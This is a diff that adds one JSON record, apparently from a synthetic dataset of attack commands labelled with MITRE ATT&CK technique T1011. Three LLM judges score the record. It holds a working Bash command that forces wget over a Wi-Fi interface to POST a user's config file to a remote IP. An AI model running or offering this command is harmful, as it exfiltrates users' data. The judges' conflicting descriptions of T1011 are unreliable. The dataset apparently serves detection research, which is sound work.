@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && wget --quiet --tries=1 --timeout=5 --bind-address=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" --post-file=/home/user/.config/cache.json http://10.55.88.13:49502/ingest",
+  "explanation": "Uses wget with --bind-address to force an HTTP POST over wlan1 to an uncommon port, aligning with T1011 by using a separate Wi\u2011Fi medium for exfiltration.",
+  "rationale_steps": [
+    "Check wlan1 status with iwconfig.",
+    "Bind the HTTP client to wlan1\u2019s IP ensuring the alternate medium is used.",
+    "POST the data to a high-numbered port to avoid common service patterns."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-c9a750ea",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for iwconfig and wget, correct command chaining with && operator, and proper use of command substitution.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns with exfiltration over alternative protocol (T1011) by checking for wlan1 interface availability and using it to POST local data to a remote server, though it doesn't directly establish accounts as described in the technique.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T10:25:26.637805Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct command chaining, valid flags, proper quoting, and a syntactically sound command substitution for the bind address.",
+        "semantic_score": 1,
+        "semantic_justification": "The command's action is data exfiltration, which is entirely unrelated to MITRE ATT&CK T1011 (Establish Accounts), despite the explanation's claim of alignment.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T10:25:34.707089Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash command with balanced quoting, proper command substitution and separators, and valid wget/ip/awk/cut options.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates the file via HTTP POST bound to wlan1\u2019s IPv4 address, typically forcing Wi\u2011Fi egress consistent with exfiltration-over-other-medium, but can fail if wlan1 lacks an IPv4 address or routing.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T10:25:54.685017Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
